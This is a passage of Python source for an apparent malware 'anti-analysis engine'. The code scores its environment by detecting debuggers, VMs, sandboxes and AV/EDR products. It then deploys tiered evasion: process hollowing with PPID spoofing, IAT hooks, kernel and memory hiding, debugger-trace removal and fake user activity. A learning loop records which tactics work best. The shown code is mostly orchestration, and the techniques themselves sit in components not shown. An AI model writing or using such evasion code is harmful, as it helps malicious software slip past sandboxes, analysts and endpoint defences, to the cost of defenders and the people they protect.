                if debugger_result.get('detected') and ThreatSignal is not None:
                    # Add timing-based detection as a debounced signal
                    timing_signal = ThreatSignal(
                        'debugger_timing_analysis', True, 60, 20,
                        details={'method': 'timing_analysis', 'duration_ms': debugger_result.get('timing_ms')}
                    )
                    
                    # Add PEB check as a debounced signal
                    peb_signal = ThreatSignal(
                        'debugger_peb_flag', True, 85, 25,
                        details={'method': 'peb_check'}
                    )
                    
                    # Use debouncing: require 2 independent confirmations
                    if self.threat_scorer.add_debounced_signal('debugger_detection', timing_signal, required_confirmations=1):
                        logger.warning("[CALIBRATION] Debugger detected (timing analysis confirmed)")
                        debugger_details['timing_detected'] = True
                    
                    if self.threat_scorer.add_debounced_signal('debugger_detection', peb_signal, required_confirmations=1):
                        logger.warning("[CALIBRATION] Debugger detected (PEB flag confirmed)")
                        debugger_details['kernel_debugger'] = debugger_result.get('kernel_debugger', False)
                
                assessment['debugger_detection'] = debugger_details
                
            except Exception as e:
                logger.debug(f"Debugger detection failed: {e}")
        
        # ====================================================================
        # STEP 5: CALCULATE CALIBRATED THREAT SCORE
        # ====================================================================
        if self.threat_scorer:
            try:
                self.threat_level = self.threat_scorer.calculate_score()
                logger.info(f"[CALIBRATION] Threat score: {self.threat_level}/100")
                
                # Get recommended evasion level from calibration system
                self.evasion_tier = self.threat_scorer.get_recommended_evasion_level(self.threat_level)
                self.should_evade = self.evasion_tier != 'none'
                
                assessment['threat_calibration'] = {
                    'score': self.threat_level,
                    'evasion_tier': self.evasion_tier,
                    'should_evade': self.should_evade,
                    'signal_summary': self.threat_scorer.get_signal_summary(),
                }
                
                logger.info(f"[CALIBRATION] Recommended evasion: {self.evasion_tier}")
                
                # ✅ NEW: Use signal mutability mapping to get relevant evasion tactics
                if SIGNAL_MUTABILITY_AVAILABLE and hasattr(self.threat_scorer, 'get_relevant_evasion_tactics'):
                    try:
                        relevant_tactics = self.threat_scorer.get_relevant_evasion_tactics()
                        assessment['threat_calibration']['relevant_tactics'] = relevant_tactics
                        
                        if relevant_tactics.get('available') and relevant_tactics.get('relevant_tactics'):
                            logger.info(f"[SIGNAL-MAPPING] Detected threats: {relevant_tactics['detected_threats']}")
                            logger.info(f"[SIGNAL-MAPPING] Most effective tactics: {[t['tactic'] for t in relevant_tactics['relevant_tactics'][:3]]}")
                        else:
                            logger.info(f"[SIGNAL-MAPPING] No mutable signals detected - Environmental threats only (immutable)")
                    except Exception as e:
                        logger.debug(f"Failed to get relevant evasion tactics: {e}")
                
            except Exception as e:
                logger.debug(f"Threat calculation failed: {e}")
                self.threat_level = 50  # Default to medium on error
                self.should_evade = True
                self.evasion_tier = 'behavioral_noise'
        
        self.is_analyzed_environment = self.should_evade
        
        logger.info(f"\n[CALIBRATION] Assessment Summary:")
        logger.info(f"  Environment Context: {self.environment_context}")
        logger.info(f"  VM Detected: {assessment['detection_details']['vm_detection'].get('is_vm', False)}")
        logger.info(f"  Sandbox Detected: {assessment['detection_details']['sandbox_detection'].get('is_sandboxed', False)}")
        logger.info(f"  AV Products: {len(assessment['detection_details']['edr_av_detection'].get('detected_av', []))}")
        logger.info(f"  EDR Products: {len(assessment['detection_details']['edr_av_detection'].get('detected_edr', []))}")
        logger.info(f"\n  THREAT SCORE: {self.threat_level}/100 (CALIBRATED)")
        logger.info(f"  EVASION TIER: {self.evasion_tier.upper()}")
        logger.info(f"  SHOULD EVADE: {self.should_evade}")
        logger.info("=" * 70 + "\n")
        
        return assessment
    
    def deploy_evasion_tactics(self) -> Dict[str, Any]:
        """
        IMPROVED: Deploy evasion tactics with:
        ✅ Adaptive tier selection based on calibrated threat
        ✅ Post-evasion validation (measure effectiveness)
        ✅ Feedback loop integration (learn what works)
        
        Tiers (from threat_calibration):
        - none: No tactics
        - passive_monitoring: Just reduce visibility
        - behavioral_noise: Add decoy activity
        - process_hollowing: Inject into legitimate process
        - aggressive_evasion: Full bag of tricks
        """
        if not self.should_evade:
            logger.info("[EVASION] Threat level acceptable - evasion tactics not deployed")
            return {
                'deployed': False,
                'reason': 'Threat level acceptable',
                'tier': 'none'
            }
        
        logger.info(f"[EVASION] Deploying {self.evasion_tier.upper()} evasion tactics...")
        
        evasion_result = {
            'deployed': True,
            'tier': self.evasion_tier,
            'timestamp': time.time(),
            'validation': {},  # Will be populated by validation
        }
        
        # ====================================================================
        # Deploy tactics based on calibrated tier
        # ====================================================================
        if self.evasion_tier == 'passive_monitoring':
            # Passive: Just reduce visibility, no active deception
            evasion_result['passive_monitoring'] = {
                'enabled': True,
                'techniques': ['reduce_logging', 'hide_process_details']
            }
            logger.info("[EVASION] Passive monitoring mode enabled")
        
        elif self.evasion_tier == 'behavioral_noise':
            # Behavioral noise: Add decoy activity
            if self.noisifier:
                try:
                    self.noisifier.start_noise_generator()
                    evasion_result['behavioral_noise'] = 'ACTIVE'
                    logger.info("[EVASION] Behavioral noise generator started")
                    
                    # POST-EVASION VALIDATION: Measure effectiveness
                    if self.validator:
                        validation_result = self.validator.validate_evasion(
                            tactic_name='behavioral_noise',
                            execute_evasion_fn=lambda: {'noise_running': True},
                            pre_detection_measurement_fn=lambda: self.threat_scorer.get_signal_summary() if self.threat_scorer else {},
                            post_detection_measurement_fn=lambda: self.threat_scorer.get_signal_summary() if self.threat_scorer else {}
                        )
                        evasion_result['validation'] = {
                            'tactic': validation_result.tactic_name,
                            'pre_score': validation_result.pre_detection_score,
                            'post_score': validation_result.post_detection_score,
                            'effectiveness': validation_result.effectiveness,
                            'success': validation_result.success,
                        }
                        logger.info(f"[EVASION] Behavioral noise effectiveness: {validation_result.effectiveness:.1f}%")
                        
                        # FEEDBACK LOOP: Record result for learning
                        if self.learner:
                            self.learner.record_validation_result(validation_result)
                
                except Exception as e:
                    logger.warning(f"[EVASION] Failed to start behavioral noise: {e}")
                    evasion_result['behavioral_noise'] = 'FAILED'
        
        elif self.evasion_tier == 'process_hollowing':
            # Process hollowing: Inject into legitimate process
            if self.advanced_hollower:
                try:
                    ppid = self.advanced_hollower.find_spoofed_ppid_from_env()
                    if ppid:
                        evasion_result['process_hollowing'] = {
                            'enabled': True,
                            'spoofed_ppid': ppid,
                            'technique': 'PPID spoofing'
                        }
                        logger.info(f"[EVASION] Process hollowing configured with PPID spoofing: {ppid}")
                        
                        # POST-EVASION VALIDATION
                        if self.validator:
                            validation_result = self.validator.validate_evasion(
                                tactic_name='process_hollowing',
                                execute_evasion_fn=lambda: evasion_result['process_hollowing'],
                                pre_detection_measurement_fn=lambda: self.threat_scorer.get_signal_summary() if self.threat_scorer else {},
                                post_detection_measurement_fn=lambda: self.threat_scorer.get_signal_summary() if self.threat_scorer else {}
                            )
                            evasion_result['validation'] = {
                                'tactic': validation_result.tactic_name,
                                'effectiveness': validation_result.effectiveness,
                                'success': validation_result.success,
                            }
                            logger.info(f"[EVASION] Process hollowing effectiveness: {validation_result.effectiveness:.1f}%")
                            
                            # FEEDBACK LOOP
                            if self.learner:
                                self.learner.record_validation_result(validation_result)
                    else:
                        logger.debug("[EVASION] Could not find suitable parent process for hollowing")
                except Exception as e:
                    logger.warning(f"[EVASION] Failed to configure process hollowing: {e}")
        
        elif self.evasion_tier == 'aggressive_evasion':
            # Full arsenal: Behavioral noise + process hollowing + all techniques
            tactics_deployed = []
            
            # Enable behavioral noise
            if self.noisifier:
                try:
                    self.noisifier.start_noise_generator()
                    evasion_result['behavioral_noise'] = 'ACTIVE'
                    tactics_deployed.append('behavioral_noise')
                except Exception:
                    pass
            
            # Enable memory evasion techniques
            if self.memory_evasion:
                try:
                    evasion_result['memory_evasion'] = self.memory_evasion.enable_all()
                    tactics_deployed.append('memory_evasion')
                except Exception:
                    pass
            
            # Enable process hollowing
            if self.advanced_hollower:
                try:
                    ppid = self.advanced_hollower.find_spoofed_ppid_from_env()
                    if ppid:
                        evasion_result['process_hollowing'] = {
                            'enabled': True,
                            'spoofed_ppid': ppid,
                        }
                        tactics_deployed.append('process_hollowing')
                except Exception:
                    pass
            
            # TIER 5: Enable enhanced evasion tactics (IAT hooks, kernel hiding, memory hiding)
            if self.enhanced_evasion:
                try:
                    logger.info("[EVASION] Deploying TIER 5 enhanced evasion tactics...")
                    enhanced_result = self.enhanced_evasion.deploy_full_evasion_suite()
                    evasion_result['enhanced_evasion'] = enhanced_result
                    tactics_deployed.extend(enhanced_result.get('tactics_deployed', []))
                    logger.info(f"[EVASION] Enhanced evasion tactics deployed: {enhanced_result['tactics_deployed']}")
                except Exception as e:
                    logger.warning(f"[EVASION] Failed to deploy enhanced evasion: {e}")
            
            # TIER 5: Deploy individual component tactics
            # Deploy IAT hooks to intercept critical Windows APIs
            iat_result = self.deploy_iat_hooks()
            if iat_result['deployed']:
                evasion_result['iat_hooks'] = iat_result
                tactics_deployed.append('iat_hooks')
            
            # Deploy memory hiding to encrypt sensitive regions
            memory_result = self.deploy_memory_hiding()
            if memory_result['deployed']:
                evasion_result['memory_hiding'] = memory_result
                tactics_deployed.append('memory_hiding')
            
            # Deploy kernel hiding to hide from kernel enumeration
            kernel_result = self.deploy_kernel_hiding()
            if kernel_result['deployed']:
                evasion_result['kernel_hiding'] = kernel_result
                tactics_deployed.append('kernel_hiding')
            
            # Deploy debugger trace hiding to remove detection artifacts
            debugger_result = self.deploy_debugger_trace_hiding()
            if debugger_result['deployed']:
                evasion_result['debugger_trace_hiding'] = debugger_result
                tactics_deployed.append('debugger_trace_hiding')
            
            # TIER 5b: Start user activity emulation (realistic user behavior baseline)
            if self.activity_emulator:
                try:
                    logger.info("[EVASION] Starting user activity emulation...")
                    if not self.activity_emulator.enabled:
                        self.activity_emulator.start_activity_emulation()
                        evasion_result['user_activity_emulation'] = 'ACTIVE'
                        tactics_deployed.append('user_activity_emulation')
                        logger.info("[EVASION] User activity emulation started")
                except Exception as e:
                    logger.warning(f"[EVASION] Failed to start user activity emulation: {e}")
            
            logger.info(f"[EVASION] Aggressive evasion deployed: {tactics_deployed}")
            
            # POST-EVASION VALIDATION: Overall effectiveness
            if self.validator:
                validation_result = self.validator.validate_evasion(
                    tactic_name='aggressive_evasion_suite',
                    execute_evasion_fn=lambda: {'tactics': tactics_deployed},
                    pre_detection_measurement_fn=lambda: self.threat_scorer.get_signal_summary() if self.threat_scorer else {},
                    post_detection_measurement_fn=lambda: self.threat_scorer.get_signal_summary() if self.threat_scorer else {}
                )
                evasion_result['validation'] = {
                    'tactic': validation_result.tactic_name,
                    'pre_score': validation_result.pre_detection_score,
                    'post_score': validation_result.post_detection_score,
                    'effectiveness': validation_result.effectiveness,
                    'success': validation_result.success,
                }
                logger.info(f"[EVASION] Overall evasion effectiveness: {validation_result.effectiveness:.1f}%")
                
                # FEEDBACK LOOP
                if self.learner:
                    self.learner.record_validation_result(validation_result)
        
        # ====================================================================
        # ADAPTIVE RECOMMENDATIONS: Get best tactics for next time
        # ====================================================================
        if self.learner:
            try:
                recommended_tactics = self.learner.get_recommended_tactics(self.threat_level, count=3)
                evasion_result['recommended_tactics_next_time'] = recommended_tactics
                logger.info(f"[EVASION] Recommended tactics for similar threats: {recommended_tactics}")
            except Exception:
                pass
        
        logger.info(f"[EVASION] Evasion deployment complete")
        return evasion_result
    
    def _query_system_info_via_wintypes(self) -> Dict[str, Any]:
        """
        Query system information using explicit wintypes definitions.
        Demonstrates direct use of ctypes.wintypes for Windows API calls.
        """
        if platform.system() != 'Windows':
            return {}
        
        try:
            # Create Windows API structure using wintypes
            class OSVERSIONINFO(ctypes.Structure):
                _fields_ = [
                    ('dwOSVersionInfoSize', wintypes.DWORD),
                    ('dwMajorVersion', wintypes.DWORD),
                    ('dwMinorVersion', wintypes.DWORD),
                    ('dwBuildNumber', wintypes.DWORD),
                    ('dwPlatformId', wintypes.DWORD),
                    ('szCSDVersion', wintypes.CHAR * 128),
                ]
            
            # Use wintypes for proper Windows API structure definition
            info = OSVERSIONINFO()
            info.dwOSVersionInfoSize = ctypes.sizeof(OSVERSIONINFO)
            
            kernel32 = ctypes.windll.kernel32
            result = kernel32.GetVersionExA(ctypes.byref(info))
            
            return {
                'os_version': f'{info.dwMajorVersion}.{info.dwMinorVersion}',
                'build': info.dwBuildNumber,
                'platform_id': info.dwPlatformId,
                'detected': bool(result)
            }
        except Exception as e:
            logger.debug(f"OSVERSIONINFO query failed: {e}")
            return {}


if __name__ == '__main__':
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(name)s - %(message)s'
    )
    
    # Run comprehensive assessment
    engine = AntiAnalysisEngine()
    assessment = engine.assess_environment()
    
    # Deploy evasion if needed
    evasion = engine.deploy_evasion_tactics()
    
    print(f"\nFinal Assessment:\n{assessment}")
    print(f"\nEvasion Status:\n{evasion}")
